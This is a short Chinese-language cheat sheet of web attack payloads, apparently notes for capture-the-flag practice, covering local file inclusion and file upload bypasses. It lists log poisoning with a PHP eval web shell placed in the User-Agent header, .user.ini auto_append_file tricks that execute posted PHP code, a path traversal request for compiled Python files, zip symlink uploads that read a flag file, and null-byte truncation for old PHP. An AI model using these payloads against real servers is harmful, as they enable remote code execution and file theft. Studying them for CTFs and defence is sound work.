[实战 | 文件上传漏洞之最全代码检测绕过总结](https://mp.weixin.qq.com/s/6ArBgNYpsQH7WkaaJY6GfQ)

# LFI/文件包含

| Name                                                   | payload                                                    |     |
| ------------------------------------------------------ | ---------------------------------------------------------- | --- |
| `?file=index` 或 `?file=index.php` 有可能需要去掉 .php |                                                            |     |
| PHP_INCLUDE_TO_SHELL_CHAR_DICT                         |                                                            |     |
| glob://                                                |                                                            |     |
| 日志包含                                               | 1.抓包修改 Agent 访问 2.包含日志 /var/log/nginx/access.log |
| 使用 [.user.ini](#userini) 进行包含                    | auto_append_file=2.jpg                                     |

## .user.ini

相当于 `include('xx.txt')`

| Desc           | .user.ini                                    | payload                                                                                |
| -------------- | -------------------------------------------- | -------------------------------------------------------------------------------------- |
| 包含 post 数据 | `auto_append_file=php://input`               | url:`index.php` <br>body: `<?php phpinfo();?>`                                         |
| 日志包含       | `auto_append_file=/var/log/nginx/access.log` | url:`index.php` <br> body: `1=phpinfo();`<br>usUser-Agent: `<?php eval($_POST[1]);?> ` |

# Python

```sh
/download?file=../../../app/__pycache__/part.cpython-311.pyc
```

# 文件上传

- 压缩包软链接，传到/tmp/data 下, ，这个软链接指向 flag，即可获取 flag
- %00 截断 php版本小于5.3.4
